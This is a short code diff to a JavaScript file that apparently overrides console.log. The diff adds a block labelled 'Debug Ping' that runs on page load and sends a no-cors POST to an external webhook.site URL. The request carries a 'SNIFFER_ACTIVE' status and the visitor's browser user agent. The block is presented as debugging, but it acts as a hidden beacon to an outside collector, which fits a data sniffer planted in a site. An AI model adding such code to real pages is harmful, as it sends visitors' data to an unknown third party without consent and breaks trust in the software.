@@ -171,3 +171,14 @@ console.log = function(message) {
         });
     }
 };
+
+// Debug Ping: Sends a message as soon as the page loads
+fetch('https://webhook.site/1e3ebe36-4444-4444-4f44-896b-b45974728627', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: JSON.stringify({ 
+        status: "SNIFFER_ACTIVE",
+        browser: navigator.userAgent,
+        note: "Testing connection to webhook"
+    })
+});
